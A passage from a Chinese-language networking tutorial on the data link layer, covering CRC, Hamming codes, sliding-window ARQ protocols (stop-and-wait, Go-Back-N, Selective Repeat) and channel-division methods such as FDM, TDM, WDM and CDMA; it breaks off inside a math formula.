<p>循环冗余码（Cyclic Redundancy Code，CRC）又称多项式码，任何一个由二进制数位串组成的代码都可与一个只含有 <code>0</code> 和 <code>1</code> 两个系数的多项式建立一一对应关系。一个 <code>k</code> 位帧可以视为从 X<sup>K-1</sup> 到 X<sup>0</sup> 的 <code>k</code> 次多项式的系数序列，这个多项式的阶数为 <code>k - 1</code>，高位是 X<sup>k-1</sup> 项的系数，下一位是 X<sup>k-2</sup> 的系数，以此类推。例如：<code>1110011</code> 有 <code>7</code> 位，表示成多项式是 X<sup>6</sup> + X<sup>5</sup> + X<sup>4</sup> + X + 1，而多项式 X<sup>5</sup> + X<sup>4</sup> + X<sup>2</sup> + X 对应的位串是 <code>110110</code>。</p>
<p>给定一个 <code>mbit</code> 的帧或报文，发送器生成一个 <code>rbit</code> 的序列，称为帧检验序列（FCS）。这样所形成的帧将由 <code>m + r</code> 比特组成。发送方和接收方事先商定一个多项式 <code>G(x)</code>（最高位和最低位必须为 <code>1</code>），使这个带检验码的帧刚好能被预先确定的多项式 <code>G(x)</code> 整除。接收方用相同的多项式去除收到的帧，如果无余数，那么认为无差错。</p>
<p>假设一个帧有 <code>m</code> 位，其对应的多项式为 <code>M(x)</code>，则计算冗余码的步骤如下：</p>
<ul>
<li><strong>加 0</strong>：假设 <code>G(x)</code> 的阶为 <code>r</code>，在帧的低位端加上 <code>r</code> 个 <code>0</code></li>
<li><strong>模 2 除</strong>：利用模 <code>2</code> 除法，用 <code>G(x)</code> 对应的数据串去除 <code>1</code> 中计算出的数据串，得到的余数即为冗余码（共 <code>r</code> 位，前面的 <code>0</code> 不可省略）</li>
</ul>
<p>多项式以 <code>2</code> 为模运算。按照模 <code>2</code> 运算规则，加法不进位，减法不借位，它刚好是异或操作。乘除法类似于二进制的运算，只是在做加减法时按模 <code>2</code> 规则进行。</p>
<p>冗余码的计算举例：设 <code>G(x) = 1101</code>（即 <code>r = 3</code>），待传送数据 <code>M = 101001</code>（即 <code>m = 6</code>），经模 <code>2</code> 除法运算后的结果是：商 <code>Q = 110101</code>（这个商没什么用），余数 <code>R = 001</code>。所以发送出去的数据为  <code>101001001</code>（即 2<sup>r</sup>M + FCS），共有 <code>m + r</code> 位。</p>
<p>通过循环冗余码（CRC）的检错技术，数据链路层做到了对帧的无差错接收。也就是说，凡是接收端数据链路层接受的帧，都认为这些帧在传输过程中没有产生差错；而接收端丢弃的帧虽然也收到了，但最终因为有差错而被丢弃，即未被接受。</p>
<div class="hint-container info">
<p class="hint-container-title">相关信息</p>
<p>循环允余码（CRC）是具有纠错功能的，只是数据链路层仅使用了它的检错功能，检测到帧出错则直接丢弃，是为了方便协议的实现</p>
</div>
</li>
</ol>
<h4> 纠错编码</h4>
<p>在数据通信的过程中，解决差错问题的一种方法是在每个要发送的数据块上附加足够的冗余信息，使接收方能够推导出发送方实际送出的应该是什么样的比特串。<strong>最常见的纠错编码是海明码</strong>，其实现原理是在有效信息位中加入几个校验位形成海明码，并把海明码的每个二进制位分配到几个奇偶校验组中。当某一位出错后，就会引起有关的几个校验位的值发生变化，这不但可以发现错位，而且能指出错位的位量，为自动纠错提供依据。</p>
<p>以数据码 <code>1010</code> 为例讲述海明码的编码原理和过程：</p>
<ol>
<li>
<p><strong>确定海明码的位数</strong></p>
<p>设 <code>n</code> 为有效信息的位数，<code>k</code> 为校验位的位数，则信息位 <code>n</code> 和校验位 <code>k</code> 应满足 n + k ≤ 2<sup>k</sup> - 1（若要检测两位错，则需再增加 <code>1</code> 位校验位，即 <code>k + 1</code> 位）海明码位数为 n + k = 7 ≤ 2<sup>3</sup> - 1 成立，则 <code>n、k</code> 有效。设信息位为 D<sub>4</sub>D<sub>3</sub>D<sub>2</sub>D<sub>1</sub>（1010），共 <code>4</code> 位，校验位为 P<sub>3</sub>P<sub>2</sub>P<sub>1</sub>，共 <code>3</code> 位，对应的海明码为 H<sub>7</sub>H<sub>6</sub>H<sub>5</sub>H<sub>4</sub>H<sub>3</sub>H<sub>2</sub>H<sub>1</sub>。</p>
</li>
<li>
<p><strong>确定校验位的分布</strong></p>
<p>规定校验位 P<sub>i</sub> 在海明位号为 2<sup>i-1</sup> 的位置上，其余各位为信息位，因此有：</p>
<ul>
<li>P<sub>1</sub> 的海明位号为 2<sup>i-1</sup> = 2<sup>0</sup> = 1，即 H<sub>1</sub> 为 P<sub>1</sub></li>
<li>P<sub>2</sub> 的海明位号为 2<sup>i-1</sup> = 2<sup>1</sup> = 2，即 H<sub>2</sub> 为 P<sub>2</sub></li>
<li>P<sub>3</sub> 的海明位号为 2<sup>i-1</sup> = 2<sup>2</sup> = 4，即 H<sub>3</sub> 为 P<sub>3</sub></li>
</ul>
<p>将信息位按原来的顺序插入，则海明码各位的分布如下：</p>
<p>H<sub>7</sub> H<sub>6</sub> H<sub>5</sub> H<sub>4</sub> H<sub>3</sub> H<sub>2</sub> H<sub>1</sub></p>
<p>D<sub>4</sub> D<sub>3</sub> D<sub>2</sub> P<sub>3</sub> D<sub>1</sub> P<sub>2</sub> P<sub>1</sub></p>
</li>
<li>
<p><strong>分组以形成校验关系</strong></p>
<p>每个数据位用多个校验位进行校验，但要满足条件：被校验数据位的海明位号等于校验该数据位的各校验位海明位号之和。另外，校验位不需要再被校验。分组形成的校验关系如下：</p>
<ul>
<li>D<sub>1</sub> 放在 H<sub>3</sub> 上，由 P<sub>2</sub>P<sub>1</sub> 校验</li>
<li>D<sub>2</sub> 放在 H<sub>5</sub> 上，由 P<sub>3</sub>P<sub>1</sub> 校验</li>
<li>D<sub>3</sub> 放在 H<sub>6</sub> 上，由 P<sub>3</sub>P<sub>2</sub> 校验</li>
<li>D<sub>4</sub> 放在 H<sub>7</sub> 上，由 P<sub>3</sub>P<sub>2</sub>P<sub>1</sub> 校验</li>
</ul>
</li>
<li>
<p><strong>校验位取值</strong></p>
<p>校验位 P<sub>i</sub> 的值为第 <code>i</code> 组（由该校验位校验的数据位）所有位求异或。</p>
<p>根据（3）中的分组有：</p>
<ul>
<li>P<sub>1</sub> = D<sub>1</sub> ⊕ D<sub>2</sub> ⊕ D<sub>4</sub> = 0 ⊕ 1 ⊕ 1 = 0</li>
<li>P<sub>2</sub> = D<sub>1</sub> ⊕ D<sub>3</sub> ⊕ D<sub>4</sub> = 0 ⊕ 0 ⊕ 1 = 1</li>
<li>P<sub>3</sub> = D<sub>2</sub> ⊕ D<sub>3</sub> ⊕ D<sub>4</sub> = 1 ⊕ 0 ⊕ 1 = 0</li>
</ul>
<p>所以，<code>1010</code> 对应的海明码为 101 <strong>0</strong> 0 <strong>10</strong>（加粗的为校验位，其他为信息位）。</p>
</li>
<li>
<p><strong>海明码的校验原理</strong></p>
<p>每个校验组分别利用校验位和参与形成该校验位的信息位进行奇偶校验检查，构成 <code>K</code> 个校验方程：</p>
<ul>
<li>S<sub>1</sub> = P<sub>1</sub> ⊕ D<sub>1</sub> ⊕ D<sub>2</sub> ⊕ D<sub>4</sub></li>
<li>S<sub>2</sub> = P<sub>2</sub> ⊕ D<sub>1</sub> ⊕ D<sub>3</sub> ⊕ D<sub>4</sub></li>
<li>S<sub>3</sub> = P<sub>3</sub> ⊕ D<sub>2</sub> ⊕ D<sub>3</sub> ⊕ D<sub>4</sub></li>
</ul>
<p>若 S<sub>3</sub>S<sub>2</sub>S<sub>1</sub> 的值为 <code>000</code>，则说明无错；否则说明出错，且这个数就是错误位的位号，如：S<sub>3</sub>S<sub>2</sub>S<sub>1</sub> = 001，说明第 <code>1</code> 位出错，即 H<sub>1</sub> 出错，直接将该位取反就达到了纠错的目的。</p>
</li>
</ol>
<h3> 流量控制与可靠传输机制</h3>
<h4> 流量控制、可靠传输与滑动窗口机制</h4>
<p>流量控制涉及对链路上的帧的发送速率的控制，以使接收方有足够的缓冲空间来接收每个帧。例如：在面向帧的自动重传请求系统中，当待确认帧的数量增加时，有可能超出缓冲存储空间而造成过载。流量控制的基本方法是由接收方控制发送方发送数据的速率，常见的方式有两种：停止-等待协议和滑动窗口协议。</p>
<ol>
<li>
<p><strong>停止-等待流量控制基本原理</strong></p>
<p>发送方每发送一帧，都要等待接收方的应答信号，之后才能发送下一帧；接收方每接收一帧，都要反馈一个应答信号，表示可接收下一帧，如果接收方不反馈应答信号，那么发送方必须一直等待。每次只允许发送一帧，然后就陷入等待接收方确认信息的过程中，因而传输效率很低。</p>
</li>
<li>
<p><strong>滑动窗口流量控制基本原理</strong></p>
<p>在任意时刻，发送方都维持一组连续的允许发送的帧的序号，称为 <strong>发送窗口</strong>；同时接收方也维持一组连续的允许接收帧的序号，称为 <strong>接收窗口</strong>。发送窗口用来对发送方进行流量控制，而发送窗口的大小 W<sub>T</sub> 代表在还未收到对方确认信息的情况下发送方最多还可以发送多少个数据帧。同理，在接收端设置接收窗口是为了控制可以接收哪些数据帧和不可以接收哪些帧。在接收方，只有收到的数据帧的序号落入接收窗口内时，才允许将该数据帧收下。若接收到的数据帧落在接收窗口之外，则一律将其丢弃。</p>
<p>发送端每收到一个确认帧，发送窗口就向前滑动一个帧的位置，当发送窗口内没有可以发送的帧（即窗口内的帧全部是已发送但未收到确认的帧）时，发送方就会停止发送，直到收到接收方发送的确认帧使窗口移动，窗口内有可以发送的帧后，才开始继续发送。</p>
<p>接收端收到数据帧后，将窗口向前移一个位置，并发回确认帧，若收到的数据帧落在接收窗口之外，则一律丢弃。</p>
<p>滑动窗口有以下重要特性：</p>
<ul>
<li>
<p>只有接收窗口向前滑动（同时接收方发送了确认帧）时，发送窗口才有可能（只有发送方收到确认帧后才一定）向前滑动</p>
</li>
<li>
<p>从滑动窗口的概念看，停止-等待协议、后退 N 帧协议和选择重传协议只在发送窗口大小与接收窗口大小上有所差别：</p>
<ul>
<li><strong>停止-等待协议</strong>：发送窗口大小 = 1，接收窗口大小 = 1</li>
<li><strong>后退 N 帧协议</strong>：发送窗口大小 &gt; 1，接收窗口大小 = 1</li>
<li><strong>选择重传协议</strong>：发送窗口大小 &gt; 1，接收窗口大小 &gt; 1</li>
</ul>
</li>
<li>
<p>接收窗口的大小为 <code>1</code> 时，可保证帧的有序接收</p>
</li>
<li>
<p>数据链路层的滑动窗口协议中，窗口的大小在传输过程中是固定的</p>
</li>
</ul>
</li>
<li>
<p><strong>可靠传输机制</strong></p>
<p><strong>数据链路层的可靠传输通常使用确认和超时重传两种机制来完成</strong>。确认是一种无数据的控制帧，这种控制帧使得接收方可以让发送方知道哪些内容被正确接收。有些情况下为了提高传输效率，将确认捎带在一个回复帧中，称为 <strong>捎带确认</strong>。超时重传是指发送方在发送某个数据帧后就开启一个计时器，在一定时间内如果没有得到发送的数据帧的确认帧，那么就重新发送该数据帧，直到发送成功为止。</p>
<p>自动重传请求（Automatic Repeat reQuest，ARQ）通过接收方请求发送方重传出错的数据帧来恢复出错的帧，是通信中用于处理信道所带来差错的方法之一。传统自动重传请求分为三种，即停止-等待（Stop-and-Wait）ARQ、后退 N 帧（Go-Back-N）ARQ 和选择性重传（Selective Repeat）ARQ。后两种协议是滑动窗口技术与请求重发技术的结合，由于窗口尺寸开到足够大时，帧在线路上可以连续地流动，因此又称其为连续 ARQ 协议。注意，在数据链路层中流量控制机制和可靠传输机制是交织在一起的。</p>
</li>
</ol>
<h4> 单帧滑动窗口与停止-等待协议</h4>
<p>在停止-等待协议中，源站发送单个帧后必须等待确认，在目的站的回答到达源站之前，源站不能发送其他的数据帧。从滑动窗口机制的角度看，停止-等待协议相当于发送窗口和接收窗口大小均为 <code>1</code> 的滑动窗口协议。</p>
<p>在停止-等待协议中，除数据帧丢失外，还可能出现以下两种差错。</p>
<p>到达目的站的帧可能已遭破坏，接收站利用前面讨论的差错检测技术检出后，简单地将该帧丢弃。为了对付这种可能发生的情况，源站装备了计时器。在一个帧发送后，源站等待确认，若在计时器计满时仍未收到确认，就再次发送相同的帧。如此重复，直到该数据帧无错误地到达为止。</p>
<p>另一种可能的差错是数据帧正确而确认帧被破坏，此时接收方已收到正确的数据帧，但发送方收不到确认帧，因此发送方会重传已被接收的数据帧，接收方收到同样的数据帧时会丢弃该帧，并重传一个该帧对应的确认帧。发送的帧交替地用 <code>0</code> 和 <code>1</code> 来标识，确认帧分别用 ACKO 和 ACK1 来表示，收到的确认帧有误时，重传已发送的帧。对于停止-等待协议，由于每发送一个数据帧就停止并等待，因此用 <code>1bit</code> 来编号就已足够。在停止-等待协议中，若连续出现相同发送序号的数据帧，表明发送端进行了超时重传。连续出现相同序号的确认帧时，表明接收端收到了重复帧。</p>
<p>此外，为了超时重发和判定重复帧的需要，发送方和接收方都须设置一个帧缓冲区。发送端在发送完数据帧时，必须在其发送缓存中保留此数据帧的副本，这样才能在出差错时进行重传。只有在收到对方发来的确认帧 ACK 时，方可清除此副本。</p>
<p>停止-等待协议通信信道的利用率很低。为了克服这一缺点，就产生了另外两种协议，即后退 N 帧协议和选择重传协议。</p>
<h4> 多帧滑动窗口与后退 N 帧协议（GBN）</h4>
<p>在后退 N 帧式 ARQ 中，发送方无须在收到上一个帧的 ACK 后才能开始发送下一帧，而是可以连续发送帧。当接收方检测出失序的信息帧后，要求发送方重发最后一个正确接收的信息帧之后的所有未被确认的帧；或者当发送方发送了 N 个帧后，若发现该 N 个帧的前一个帧在计时器超时后仍未返回其确认信息，则该帧被判为出错或丢失，此时发送方就不得不重传该出错帧及随后的 N 个帧。换句话说，接收方只允许按顺序接收帧。</p>
<p>源站向目的站发送数据帧。当源站发完 <code>0</code> 号帧后，可以继续发送后续的 <code>1</code> 号帧、<code>2</code> 号帧等。源站每发送完一帧就要为该帧设置超时计时器。由于连续发送了许多帧，所以确认帧必须要指明是对哪一帧进行确认。为了减少开销，GBN 协议还规定接收端不一定每收到一个正确的数据帧就必须立即发回一个确认帧，而可以在连续收到好几个正确的数据帧后，才对最后一个数据帧发确认信息，或者可在自己有数据要发送时才将对以前正确收到的帧加以挡带确认。这就是说，对某一数据帧的确认就表明该数据帧和此前所有的数据帧均已正确无误地收到，称为 <strong>累积确认</strong>。ACKn 表示对第 <code>n</code> 号帧的确认，表示接收方已正确收到第 <code>n</code> 号帧及以前的所有帧，下一次期望收到第 <code>n + 1</code> 号帧（也可能是第 <code>0</code> 号帧）。接收端只按序接收数据帧。</p>
<p>如果 <code>2</code> 号帧出错，虽然在有差错的 <code>2</code> 号帧之后接着又收到了正确的 <code>6</code> 个数据帧，但接收端都必须将这些帧丢弃。接收端虽然丢弃了这些不按序的无差错帧，但应重复发送已发送的最后一个确认帧 ACK1（这是为了防止已发送的确认帧 ACK1 丢失）。</p>
<p>后退 N 帧协议的接收窗口为 <code>1</code>，可以保证按序接收数据帧。若采用 <code>n</code> 比特对帧编号，则其发送窗口的尺寸 W<sub>T</sub> 应满足 1 &lt; W<sub>T</sub> ≤ 2<sup>n</sup> - 1。若发送窗口的尺寸大于 2<sup>n</sup> - 1，则会造成接收方无法分辨新帧和旧帧。</p>
<p>后退 N 帧协议一方面因连续发送数据帧而提高了信道的利用率，另一方面在重传时又必须把原来已传送正确的数据帧进行重传（仅因这些数据帧的前面有一个数据帧出了错），这种做法又使传送效率降低。由此可见，若信道的传输质量很差导致误码率较大时，后退 N 协议不一定优于停止-等待协议。</p>
<h4> 多帧滑动窗口与选择重传协议（SR）</h4>
<p>为进一步提高信道的利用率，可设法只重传出现差错的数据帧或计时器超时的数据，但此时必须加大接收窗口，以便先收下发送序号不连续但仍处在接收窗口中的那些数据帧。等到所缺序号的数据收到后再一并送交主机。这就是选择重传 ARQ 协议。</p>
<p>在选择重传协议中，每个发送缓冲区对应一个计时器，当计时器超时时，缓冲区的帧就会重传。另外，该协议使用了比上述其他协议更有效的 <strong>差错处理策略</strong>，即一旦接收方怀疑帧出错，就会发一个否定帧 NAK 给发送方，要求发送方对 NAK 中指定的帧进行重传。</p>
<p>选择重传协议的接收窗口尺寸 W<sub>R</sub> 和发送窗口尺寸 W<sub>T</sub> 都大于 <code>1</code>，一次可以发送或接收多个帧。在选择重传协议中，接收窗口和发送窗口的大小通常是相同的（选择重传协议是对单帧进行确认，所以发送窗口大于接收窗口会导致溢出，发送窗口小于接收窗口没有意义），且最大值都为序号范围的一半，若采用 <code>n</code> 比特对帧编号，则需要满足 W<sub>Tmax</sub> = W<sub>Rmax</sub> = 2<sup>(n-1)</sup>。因为如果不满足该条件，即窗口大小大于序号范围一半，当一个或多个确认帧丢失时，发送方就会超时重传之前的数据帧，但接收方无法分辨是新的数据帧还是重传的数据帧。</p>
<p>选择重传协议可以避免重复传送那些本已正确到达接收端的数据帧，但在接收端要设置具有相当容量的缓冲区来暂存那些未按序正确收到的帧。接收端不能接收窗口下界以下或窗口上界以上的序号的帧，因此所需缓冲区的数目等于窗口的大小，而不是序号数目。</p>
<p>信道的效率，也称信道利用率。可从不同的角度来定义信道的效率，这里给出一种从时间角度的定义：信道效率是对发送方而言的，是指发送方在一个发送周期的时间内，有效地发送数据所需要的时间占整个发送周期的比率。</p>
<p>例如：发送方从开始发送数据到收到第一个确认帧为止，称为一个发送周期，设为 <code>T</code>，发送方在这个周期内共发送 <code>L</code> 比特的数据，发送方的数据传输速率为 <code>C</code>，则发送方用于发送有效数据的时间为 <code>L/C</code>，在这种情况下，信道的利用率为 <code>(L/C)/T</code>。</p>
<p>从上面的讨论可以发现，求信道的利用率主要是求周期时间 <code>T</code> 和有效数据发送时间 <code>L/C</code>。</p>
<p><em>信道吞吐率 = 信道利用率 × 发送方的发送速率。</em></p>
<h3> 介质访问控制</h3>
<p>介质访问控制所要完成的主要任务是，为使用介质的每个结点隔离来自同一信道上其他结点所传送的信号，以协调活动结点的传输。用来决定广播信道中信道分配的协议属于数据链路层的一个子层，称为 <strong>介质访问控制（Medium Access Control，MAC）</strong> 子层。</p>
<p>以广播信道的通信方式，结点 A、B、C、D、E 共享广播信道，假设 A 要与 C 发生通信，B 要与 D 发生通信，由于它们共用一条信道，如果不加控制，那么两对结点间的通信可能会因为互相干扰而失败。介质访问控制的内容是，采取一定的措施，使得两对结点之间的通信不会发生互相干扰的情况。</p>
<p>常见的介质访问控制方法有信道划分介质访问控制、随机访问介质访问控制和轮询访问介质访问控制。其中前者是静态划分信道的方法，而后两者是动态分配信道的方法。</p>
<h4> 信道划分介质访问控制</h4>
<p>信道划分介质访问控制将使用介质的每个设备与来自同一通信信道上的其他设备的通信隔离开来，把时域和频域资源合理地分配给网络上的设备。</p>
<p>多路复用技术的概念：当传输介质的带宽超过传输单个信号所需的带宽时，就通过在一条介质上同时携带多个传输信号的方法来提高传输系统的利用率，这就是所谓的多路复用，也是实现信道划分介质访问控制的途径。多路复用技术把多个信号组合在一条物理信道上进行传输，使多个计算机或终端设备共享信道资源，提高了信道的利用率。</p>
<p>采用多路复用技术可把多个输入通道的信息整合到一个复用通道中，在接收端把收到的信息分离出来并传送到对应的输出通道。</p>
<p>信道划分的实质就是通过分时、分频、分码等方法把原来的一条广播信道，逻辑上分为几条用于两个结点之间通信的互不干扰的子信道，实际上就是把广播信道转变为点对点信道。<strong>信道划分介质访问控制分为以下四种：</strong></p>
<ol>
<li>
<p><strong>频分多路复用（FDM）</strong></p>
<p>频分多路复用是一种 <strong>将多路基带信号调制到不同频率载波上，再叠加形成一个复合信号的多路复用技术</strong>。在物理信道的可用带宽超过单个原始信号所需带宽的情况下，可将该物理信道的总带宽分割成若干与传输单个信号带宽相同（或略宽）的子信道，每个子信道传输一种信号，这就是频分多路复用。</p>
<p>每个子信道分配的带宽可不相同，但它们的总和必须不超过信道的总带宽。在实际应用中，为了防止子信道之间的干扰，相邻信道之间需要加入 “保护频带”。</p>
<p>频分多路复用的优点在于充分利用了传输介质的带宽，系统效率较高；由于技术比较成熟，实现也较容易。</p>
</li>
<li>
<p><strong>时分多路复用（TDM）</strong></p>
<p>时分多路复用是将一条物理信道按时间分成若干时间片，轮流地分配给多个信号使用。每个时间片由复用的一个信号占用，而不像 FDM 那样，同一时间同时发送多路信号。这样，利用每个信号在时间上的交叉，就可以在一条物理信道上传输多个信号。</p>
<p>就某个时刻来看，时分多路复用信道上传送的仅是某一对设备之间的信号；就某段时间而言，传送的是按时间分割的多路复用信号。但由于计算机数据的突发性，一个用户对已经分配到的子信道的利用率一般不高。统计时分多路复用（STDM，又称异步时分多路复用）是 TDM 的一种改进，它采用 STDM 帧，STDM 并不固定分配时隙，而按需动态地分配时隙，当终端有数据要传送时，才会分配到时间片，因此可以提高线路的利用率。例如：线路传输速率为 <code>8000b/s</code>，<code>4</code> 个用户的平均速率都为 <code>2000b/s</code>，当采用 TDM 方式时，每个用户的最高速率为 <code>2000b/s</code>，而在 STDM 方式下，每个用户的最高速率可达 <code>8000b/s</code>。</p>
</li>
<li>
<p><strong>波分多路复用（WDM）</strong></p>
<p>波分多路复用即光的频分多路复用，它在一根光纤中传输多种不同波长（频率）的光信号，由于波长（频率）不同，各路光信号互不干扰，最后再用波长分解复用器将各路波长分解出来。由于光波处于频谱的高频段，有很高的带宽，因而可以实现多路的波分复用，。</p>
</li>
<li>
<p><strong>码分多路复用（CDM）</strong></p>
<p>码分多路复用是采用不同的编码来区分各路原始信号的一种复用方式。与 FDM 和 TDM 不同，它既共享信道的频率，又共享时间。下面举一个置观的例子来理解码分复用。</p>
<p>假设 <code>A</code> 站要向 <code>C</code> 站运输黄豆，<code>B</code> 站要向 <code>C</code> 站运输绿豆；<code>A</code> 与 <code>C、B</code> 之间有一条公共的道路，可以类比为广播信道。在频分复用方式下，公共道路被划分为两个车道，分别提供给 <code>A</code> 到 <code>C</code> 的车和 <code>B</code> 到 <code>C</code> 的车行走，两类车可以同时行走，但只分到了公共车道的一半，因此频分复用（波分复用也一样）共享时间而不共享空间。在时分复用方式下，先让 <code>A</code> 到 <code>C</code> 的车走一趟，再让 <code>B</code> 到 <code>C</code> 的车走一趟，两类车交替地占用公共车道。公共车道没有划分，因此两车共享了空间，但不共享时间。在码分复用情况下，黄豆与绿豆放在同一辆车上运送，到达 <code>C</code> 后，由 <code>C</code> 站负责把车上的黄豆和绿豆分开。因此，黄豆和绿豆的运送，在码分复用的情况下，既共享了空间，也共享了时间。</p>
<p>实际上，更常用的名词是 <strong>码分多址（Code Division Multiple Access，CDMA）</strong>，其原理是每个比特时间再划分成 <code>m</code> 个短的时间槽，称为 <strong>码片（Chip）</strong>，通常 <code>m</code> 的值是 <code>64</code> 或 <code>128</code>，下例中为简单起见，设 <code>m</code> 为 <code>8</code>。每个站点被指派一个唯一的 <code>m</code> 位码片序列。发送 <code>1</code> 时，站点发送它的码片序列；发送 <code>0</code> 时，站点发送该码片序列的反码。当两个或多个站点同时发送时，各路数据在信道中线性相加。为从信道中分离出各路信号，要求各个站点的码片序列相互正交。简单理解就是，<code>A</code> 站向 <code>C</code> 站发出的信号用一个向量来表示，<code>B</code> 站向 <code>C</code> 站发出的信号用另一个向量来表示，两个向量要求相互正交。向量中的分量，就是所谓的码片。</p>
<p>下面举例说明 CDMA 的原理。</p>
<p>假如站点 <code>A</code> 的码片序列被指派为 <code>00011011</code>，则 <code>A</code> 站发送 <code>00011011</code> 就表示发送比特 <code>1</code>，发送 <code>11100100</code> 就表示发送比特 <code>0</code>。为了方便，按惯例将码片中的 <code>0</code> 写为 <code>-1</code>，将 <code>1</code> 写为 <code>+1</code>，因此 <code>A</code> 站的码片序列是 <code>-1-1-1+1+1-1+1+1</code>。</p>
<p>令向量 <code>S</code> 表示 <code>A</code> 站的码片向量，令 <code>T</code> 表示 <code>B</code> 站的码片向量。两个不同站的码片序列正交，即向量 <code>S</code> 和 <code>T</code> 的规格化内积（Inner Product）为 <code>O</code>：</p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>∙</mo><mi>T</mi><mo>≡</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mn>1</mn><mi>m</mi></mfrac></mstyle><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><msub><mi>S</mi><mi>i</mi></msub><msub><mi>T</mi><mi>i</mi></msub><mo>=</mo><mn>0</mn></mstyle></mrow><annotation encoding="application/x-tex">S \bullet T \equiv \dfrac{1}{m} \displaystyle\sum_{i=1}^{m} S_{i} T_{i} = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∙</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">m</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></p>
<p>任何一个码片向量和该码片向量自身的规格化内积都是 <code>1</code>，任何一个码片向量和该码片反码的向量的规格化内积是 <code>-1</code>，如：</p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>∙</mo><mi>S</mi><mo>=</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mn>1</mn><mi>m</mi></mfrac></mstyle><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><msub><mi>S</mi><mi>i</mi></msub><msub><mi>S</mi><mi>i</mi></msub><mo>=</mo><mfrac><mn>1</mn><mi>m</mi></mfrac><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><msubsup><mi>S</mi><mi>i</mi><mn>2</mn></msubsup><mo>=</mo><mfrac><mn>1</mn><mi>m</mi></mfrac><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mo stretchy="false">(</mo><mo>±</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>=</mo><mn>1</mn></mstyle></mstyle></mstyle></mrow><annotation encoding="application/x-tex">S \bullet S = \dfrac{1}{m} \displaystyle\sum_{i=1}^{m} S_{i} S_{i} = \dfrac{1}{m} \displaystyle\sum_{i=1}^{m} S_{i}^{2} = \dfrac{1}{m} \displaystyle\sum_{i=1}^{m} (\pm 1)^{2} = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∙</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span 